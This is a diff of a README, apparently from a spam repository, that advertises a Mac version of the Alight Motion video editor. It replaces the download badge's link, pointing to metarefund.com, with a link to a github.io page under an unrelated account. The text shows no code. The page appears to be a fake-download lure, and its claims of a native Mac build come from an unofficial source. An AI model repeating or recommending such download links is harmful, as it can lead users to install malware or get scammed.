@@ -2,7 +2,7 @@
 
 Alight Motion mac delivers Mac‑optimized tools with Apple silicon support, native UI, and professional workflows.
 
-[![Download Alight Motion mac](https://img.shields.io/badge/Download-Alight_Motion_mac-blueviolet)](https://metarefund.com/)
+[![Download Alight Motion mac](https://img.shields.io/badge/Download-Alight_Motion_mac-blueviolet)](https://suzylodgeteuig.github.io/.github/Alight-Motion-Hub)
 
 ---
 
